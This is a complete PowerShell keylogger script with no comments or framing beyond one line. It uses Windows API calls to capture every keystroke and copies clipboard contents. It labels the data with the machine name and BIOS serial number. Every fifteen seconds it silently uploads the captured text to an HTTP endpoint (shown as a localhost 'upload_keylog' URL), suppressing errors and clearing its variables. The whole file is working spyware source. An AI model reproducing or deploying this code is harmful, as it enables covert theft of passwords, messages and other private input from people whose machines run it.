Add-Type @"
using System;using System.Runtime.InteropServices;using System.Text;
public class W{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);
[DllImport("user32.dll")]public static extern int GetKeyboardState(byte[] k);
[DllImport("user32.dll")]public static extern int ToUnicode(uint v,uint s,byte[] k,StringBuilder b,int c,uint f);}
"@
Add-Type -AssemblyName System.Windows.Forms

$n=@{8="[BACKSPACE]";9="[TAB]";13="[ENTER]";16="[SHIFT]";17="[CTRL]";18="[ALT]";32="[SPACE]"}
$sec=15
$d = "$($env:COMPUTERNAME)_$((Get-WmiObject Win32_BIOS).SerialNumber)"
$w="http://127.0.0.1:5000/upload_keylog"
$clipboardHistory = @()
while($true){
    $k=@();$p=@{};$s=Get-Date
    while((Get-Date)-$s-lt[TimeSpan]::FromSeconds($sec)){
        Start-Sleep -m 50
        $ks=New-Object byte[] 256    
        [W]::GetKeyboardState($ks)|Out-Null
        for($v=8;$v-le255;$v++){
            if(([W]::GetAsyncKeyState($v)-band0x8000)-ne0-and-not$p.ContainsKey($v)){
                $p[$v]=$true
                if($n.ContainsKey($v)){
                    $k+="K:$($n[$v])"
                }else{
                    $b=New-Object System.Text.StringBuilder 2
                    $r=[W]::ToUnicode([uint32]$v,0,$ks,$b,$b.Capacity,0)
                    if($r-gt0){$k+="K:$($b.ToString())"}
                }
            }elseif(-not(([W]::GetAsyncKeyState($v)-band0x8000)-ne0)-and$p.ContainsKey($v)){
                $p.Remove($v)
            }
        }
        # Capture clipboard and append if new
        try { $c = [Windows.Forms.Clipboard]::GetText() } catch { $c = "[Clipboard unavailable]" }
        if ($c -and $clipboardHistory[-1] -ne $c) { $clipboardHistory += $c }
    }
    $t = "Clipboard:`n" + ($clipboardHistory -join "`n") + "`n`nKeystrokes:`n" + ($k -join "`n")
    $f="k_$($d)_$(Get-Date -f yyyyMMdd_HHmmss).txt"
    $b=[System.Guid]::NewGuid().ToString()
    $l="`r`n"
    $bl=@("--$b","Content-Disposition: form-data; name=`"d`"$l",$d,"--$b","Content-Disposition: form-data; name=`"f1`"; filename=`"$f`"","Content-Type: text/plain$l",$t,"--$b--$l")
    $bd=$bl-join$l
    irm -Uri $w -Method Post -Body $bd -ContentType "multipart/form-data; boundary=$b" -ErrorAction SilentlyContinue >$null 2>&1
    Remove-Variable k,t,p,f,b,bl,bd,s,v,ks,b,r -ErrorAction SilentlyContinue
    [System.GC]::Collect()
}